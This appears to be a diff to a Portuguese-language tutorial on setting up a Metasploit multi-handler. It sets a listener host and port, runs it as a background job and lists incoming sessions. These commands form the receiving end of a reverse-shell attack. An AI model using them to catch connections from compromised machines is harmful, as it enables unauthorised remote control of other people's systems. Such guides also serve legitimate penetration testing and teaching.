@@ -106,9 +106,14 @@ depois de iniciado
     msf >set LHOST 34.97.212.80
     msf >set LPORT 5000
     msf >set ExitOnSession false
+```
+
+para ficar na esculta em tempo real de quem se conectou ou disconectou rode
+```shell
     msf > exploit -j -z
 ```
-  em seguida  para listar nossas conexões de entrada até o momento 
+
+ para listar nossas conexões de entrada até o momento
 
 ```shell
 msf> sessions -l 
